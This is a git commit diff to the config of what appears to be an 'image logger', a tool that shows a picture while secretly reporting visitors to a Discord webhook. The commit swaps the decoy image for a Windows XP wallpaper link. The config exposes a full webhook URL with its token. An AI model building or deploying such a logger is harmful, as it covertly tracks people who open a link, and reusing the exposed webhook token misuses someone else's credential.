16936fefeb4b4a8093ad3948779885123ca2dc07
emiiiiiiiiiiir <enginemircagan8@gmail.com>
2026-06-16 02:31:57 +0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1516216115146133616/aFBpkKb5mkTIPD_lN_1sLpVc4l3vskn8ugyBKvY6VLJtx2w4MomD8Cha4m9i7JfkgVyj",
-    "image": "mustafa-kemal-ataturk.jpg", # You can also have a custom image by using a URL argument
+    "image": "images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
